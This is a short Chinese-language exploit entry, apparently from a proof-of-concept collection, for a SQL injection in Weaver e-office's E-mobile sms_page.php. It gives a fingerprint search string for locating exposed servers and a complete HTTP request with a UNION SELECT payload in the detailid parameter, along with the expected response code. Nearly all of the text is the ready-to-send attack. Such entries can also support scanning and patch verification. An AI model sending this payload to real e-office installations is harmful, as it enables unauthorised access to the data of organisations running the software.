# 泛微e-officesms_page.phpsql注入漏洞

泛微OA ｜ SQL注入 ｜ —
- **指纹**：`header="general/login/index.php"`
- **请求**：`GET /E-mobile/sms_page.php?detailid=123%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,CONCAT(0x7e,md5(123),0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20- HTTP/1.1`

**Payload**
```
GET /sms_page.php?detailid=123%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,CONCAT(0x7e,md5(123),0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20- HTTP/1.1
Content-Type: application/json
Host:
```
- **响应特征**：200